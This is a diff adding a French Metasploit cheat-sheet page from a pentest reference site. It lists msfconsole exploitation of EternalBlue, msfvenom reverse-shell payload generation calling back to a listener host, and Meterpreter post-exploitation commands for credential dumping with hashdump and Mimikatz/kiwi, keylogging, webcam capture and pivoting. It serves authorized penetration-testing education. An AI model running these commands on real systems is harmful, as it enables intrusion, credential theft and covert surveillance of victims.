@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Metasploit — PenTest Hub</title>
+  <link rel="stylesheet" href="../css/style.css">
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+</head>
+<body>
+
+<nav class="navbar">
+  <div class="navbar-brand"><a href="../index.html" style="color:inherit;"><span class="bracket">[</span>PenTest Hub<span class="bracket">]</span></a></div>
+  <div class="navbar-nav">
+    <a href="../index.html">Dashboard</a>
+    <a href="nmap.html">Nmap</a>
+    <a href="sqlmap.html">SQLMap</a>
+    <a href="john.html">John</a>
+    <a href="google-dorks.html">Dorks</a>
+    <a href="osint.html">OSINT</a>
+    <a href="netcat.html">Netcat</a>
+  </div>
+</nav>
+
+<div class="tool-page">
+  <a href="../index.html" class="back-btn">← Retour au Hub</a>
+
+  <div class="tool-page-header">
+    <div class="tool-page-icon">🚀</div>
+    <div>
+      <div class="tool-page-title">Metasploit Framework</div>
+      <div class="tool-page-subtitle">Framework d'exploitation — Exploits, payloads, post-exploitation, Meterpreter</div>
+      <div class="tool-page-meta">
+        <span class="badge badge-red">Exploit</span>
+        <span class="badge badge-orange">Framework</span>
+        <span class="badge badge-purple">MSF</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="info-box warning">
+    <span class="info-box-icon">⚠️</span>
+    <div class="info-box-text">Metasploit est un outil puissant réservé aux tests autorisés. Son utilisation non autorisée est illégale et peut entraîner de lourdes sanctions pénales.</div>
+  </div>
+
+  <h2 class="section-h">📦 Installation & Démarrage</h2>
+  <div class="code-block">
+    <div class="code-block-header"><span class="code-block-title">Setup</span><button class="code-block-copy">⎘ Copier</button></div>
+    <pre><code><span class="cmd-comment"># Kali Linux (préinstallé)</span>
+msfconsole
+
+<span class="cmd-comment"># Initialiser la base de données</span>
+sudo msfdb init
+sudo msfdb start
+
+<span class="cmd-comment"># Démarrer msfconsole</span>
+sudo msfconsole -q    <span class="cmd-comment"># -q = sans bannière</span>
+
+<span class="cmd-comment"># Vérifier la connexion DB</span>
+msf6> db_status
+
+<span class="cmd-comment"># Mettre à jour</span>
+sudo apt update && sudo apt install metasploit-framework</code></pre>
+  </div>
+
+  <h2 class="section-h">📋 Commandes essentielles msfconsole</h2>
+  <div class="code-block">
+    <div class="code-block-header"><span class="code-block-title">Navigation & Recherche</span><button class="code-block-copy">⎘ Copier</button></div>
+    <pre><code><span class="cmd-comment"># Rechercher un module</span>
+msf6> search eternalblue
+msf6> search type:exploit platform:windows smb
+msf6> search cve:2021-44228
+msf6> search name:ms17_010
+
+<span class="cmd-comment"># Utiliser un module</span>
+msf6> use exploit/windows/smb/ms17_010_eternalblue
+msf6> use 0    <span class="cmd-comment"># utiliser par numéro dans les résultats search</span>
+
+<span class="cmd-comment"># Infos sur le module</span>
+msf6> info
+msf6> options
+msf6> show options
+
+<span class="cmd-comment"># Configurer les options</span>
+msf6> set RHOSTS 192.168.1.1
+msf6> set RPORT 445
+msf6> set LHOST 192.168.1.100
+msf6> set LPORT 4444
+
+<span class="cmd-comment"># Lancer l'exploit</span>
+msf6> run
+msf6> exploit
+
+<span class="cmd-comment"># Vérifier sans exploiter</span>
+msf6> check
+
+<span class="cmd-comment"># Retourner au menu principal</span>
+msf6> back
+
+<span class="cmd-comment"># Aide</span>
+msf6> help</code></pre>
+  </div>
+
+  <h2 class="section-h">🎯 Payloads</h2>
+  <div class="code-block">
+    <div class="code-block-header"><span class="code-block-title">Payloads courants</span><button class="code-block-copy">⎘ Copier</button></div>
+    <pre><code><span class="cmd-comment"># Lister les payloads disponibles pour le module</span>
+msf6> show payloads
+
+<span class="cmd-comment"># Payloads Meterpreter</span>
+msf6> set PAYLOAD windows/meterpreter/reverse_tcp
+msf6> set PAYLOAD windows/x64/meterpreter/reverse_tcp
+msf6> set PAYLOAD linux/x64/meterpreter/reverse_tcp
+msf6> set PAYLOAD python/meterpreter/reverse_tcp
+
+<span class="cmd-comment"># Shells simples</span>
+msf6> set PAYLOAD windows/shell/reverse_tcp
+msf6> set PAYLOAD cmd/unix/reverse_bash
+msf6> set PAYLOAD generic/shell_reverse_tcp
+
+<span class="cmd-comment"># Payloads stageless (meilleurs pour certains contextes)</span>
+msf6> set PAYLOAD windows/x64/meterpreter_reverse_tcp  <span class="cmd-comment"># sans /</span>
+
+<span class="cmd-comment"># Générer un payload avec msfvenom</span>
+msfvenom <span class="cmd-flag">-p</span> windows/x64/meterpreter/reverse_tcp <span class="cmd-flag">LHOST=</span>192.168.1.1 <span class="cmd-flag">LPORT=</span>4444 <span class="cmd-flag">-f</span> exe <span class="cmd-flag">-o</span> payload.exe
+msfvenom <span class="cmd-flag">-p</span> linux/x64/meterpreter/reverse_tcp <span class="cmd-flag">LHOST=</span>192.168.1.1 <span class="cmd-flag">LPORT=</span>4444 <span class="cmd-flag">-f</span> elf <span class="cmd-flag">-o</span> payload
+msfvenom <span class="cmd-flag">-p</span> php/meterpreter/reverse_tcp <span class="cmd-flag">LHOST=</span>192.168.1.1 <span class="cmd-flag">LPORT=</span>4444 <span class="cmd-flag">-f</span> raw <span class="cmd-flag">-o</span> shell.php
+msfvenom <span class="cmd-flag">-l</span> payloads <span class="cmd-comment"># Lister tous les payloads</span>
+msfvenom <span class="cmd-flag">-l</span> formats  <span class="cmd-comment"># Formats de sortie</span></code></pre>
+  </div>
+
+  <h2 class="section-h">🖥️ Meterpreter — Post-Exploitation</h2>
+  <div class="code-block">
+    <div class="code-block-header"><span class="code-block-title">Commandes Meterpreter</span><button class="code-block-copy">⎘ Copier</button></div>
+    <pre><code><span class="cmd-comment"># === SYSTÈME ===</span>
+meterpreter> sysinfo          <span class="cmd-comment"># Infos système</span>
+meterpreter> getuid           <span class="cmd-comment"># Utilisateur actuel</span>
+meterpreter> getpid           <span class="cmd-comment"># PID du process</span>
+meterpreter> ps               <span class="cmd-comment"># Liste des processus</span>
+meterpreter> shell            <span class="cmd-comment"># Shell système</span>
+meterpreter> pwd              <span class="cmd-comment"># Répertoire courant</span>
+meterpreter> ls               <span class="cmd-comment"># Lister fichiers</span>
+meterpreter> cd /tmp          <span class="cmd-comment"># Changer répertoire</span>
+meterpreter> search -f *.txt  <span class="cmd-comment"># Rechercher fichiers</span>
+
+<span class="cmd-comment"># === FICHIERS ===</span>
+meterpreter> download /etc/passwd
+meterpreter> upload payload.exe C:\\Windows\\Temp\\
+meterpreter> cat /etc/passwd
+
+<span class="cmd-comment"># === PRIVILEGE ESCALATION ===</span>
+meterpreter> getsystem        <span class="cmd-comment"># Tentative auto PrivEsc</span>
+meterpreter> getprivs         <span class="cmd-comment"># Voir les privilèges</span>
+meterpreter> migrate &lt;PID&gt;    <span class="cmd-comment"># Migrer dans un autre process</span>
+msf6> use post/multi/recon/local_exploit_suggester  <span class="cmd-comment"># Suggérer PrivEsc</span>
+
+<span class="cmd-comment"># === RÉSEAU ===</span>
+meterpreter> ipconfig
+meterpreter> arp
+meterpreter> portfwd add -l 8080 -p 80 -r 192.168.1.10  <span class="cmd-comment"># Port forwarding</span>
+meterpreter> route add 10.0.0.0/8 1  <span class="cmd-comment"># Pivoting</span>
+
+<span class="cmd-comment"># === CAPTURES ===</span>
+meterpreter> screenshot
+meterpreter> record_mic
+meterpreter> webcam_snap
+meterpreter> keyscan_start && keyscan_dump  <span class="cmd-comment"># Keylogger</span>
+
+<span class="cmd-comment"># === CREDENTIALS ===</span>
+meterpreter> run post/windows/gather/hashdump
+meterpreter> load kiwi       <span class="cmd-comment"># Mimikatz intégré</span>
+meterpreter> creds_all       <span class="cmd-comment"># Dump tous les credentials (kiwi)</span>
+meterpreter> lsa_dump_sam    <span class="cmd-comment"># SAM database</span>
+
+<span class="cmd-comment"># === SESSIONS ===</span>
+meterpreter> background       <span class="cmd-comment"># Mettre en arrière-plan</span>
+msf6> sessions                <span class="cmd-comment"># Voir les sessions</span>
+msf6> sessions -i 1           <span class="cmd-comment"># Rejoindre session 1</span></code></pre>
+  </div>
+
+  <h2 class="section-h">🔄 Handler universel (multi/handler)</h2>
+  <div class="code-block">
+    <div class="code-block-header"><span class="code-block-title">Listener pour payloads msfvenom</span><button class="code-block-copy">⎘ Copier</button></div>
+    <pre><code><span class="cmd-comment"># Configurer un listener</span>
+msf6> use exploit/multi/handler
+msf6> set PAYLOAD windows/x64/meterpreter/reverse_tcp
+msf6> set LHOST 0.0.0.0
+msf6> set LPORT 4444
+msf6> run -j  <span class="cmd-comment"># -j = en arrière-plan (job)</span>
+
+<span class="cmd-comment"># Voir les jobs</span>
+msf6> jobs
+
+<span class="cmd-comment"># Importer un scan Nmap</span>
+msf6> db_import scan.xml
+msf6> hosts
+msf6> services</code></pre>
+  </div>
+
+  <h2 class="section-h">⚡ Modules post-exploitation utiles</h2>
+  <div class="code-block">
+    <div class="code-block-header"><span class="code-block-title">Modules post/ et auxiliary/</span><button class="code-block-copy">⎘ Copier</button></div>
+    <pre><code"><span class="cmd-comment"># Suggérer des vecteurs de PrivEsc</span>
+msf6> use post/multi/recon/local_exploit_suggester
+msf6> set SESSION 1; run
+
+<span class="cmd-comment"># Dump hashes Windows</span>
+msf6> use post/windows/gather/hashdump
+
+<span class="cmd-comment"># Énumération Windows</span>
+msf6> use post/windows/gather/enum_applications
+msf6> use post/windows/gather/enum_shares
+msf6> use post/windows/gather/credentials/credential_collector
+
+<span class="cmd-comment"># Scanner réseau depuis la cible (pivot)</span>
+msf6> use auxiliary/scanner/portscan/tcp
+msf6> set RHOSTS 10.0.0.0/24; set PORTS 22,80,445; run
+
+<span class="cmd-comment"># SMB</span>
+msf6> use auxiliary/scanner/smb/smb_version
+msf6> use auxiliary/scanner/smb/smb_login
+
+<span class="cmd-comment"># HTTP</span>
+msf6> use auxiliary/scanner/http/http_version
+msf6> use auxiliary/scanner/http/dir_scanner</code></pre>
+  </div>
+
+</div>
+
+<footer class="footer"><span>[PenTest Hub]</span> — Usage légal uniquement | © Steveny</footer>
+<div id="toast" class="toast"></div>
+<script src="../js/main.js"></script>
+</body>
+</html>
